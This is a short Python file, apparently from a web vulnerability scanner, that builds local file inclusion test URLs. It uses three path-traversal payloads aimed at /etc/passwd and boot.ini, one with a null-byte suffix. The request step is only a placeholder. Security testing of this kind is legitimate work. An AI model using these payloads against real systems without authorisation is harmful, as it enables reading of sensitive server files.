# core/lfi.py

def run_lfi_scan(target_url):
    payloads = [
        "?page=../../../../etc/passwd",
        "?file=../../../boot.ini",
        "?inc=../../../../../../../../../../etc/passwd%00"
    ]
    for p in payloads:
        full_url = target_url + p
        print(f"[+] Testing: {full_url}")
        # Placeholder for HTTP request
